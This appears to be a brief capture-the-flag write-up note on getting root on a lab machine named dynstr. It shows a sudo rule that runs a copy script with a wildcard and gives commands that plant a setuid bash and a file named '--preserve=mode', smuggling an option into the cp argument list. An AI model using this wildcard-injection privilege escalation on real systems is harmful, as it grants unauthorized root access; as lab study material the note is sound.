# Root

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
	
	```bash
	cp .version * /etc/bind/named.bindmgr/
	```
	
We can exploit cp to get root

Do following

```bash

echo 1 >.version
cp /bin/bash . 
chmod u+s bash 
touch -- '--preserve=mode'

```
	
![[Pasted image 20211017085933.png]]

[[Enumeration]]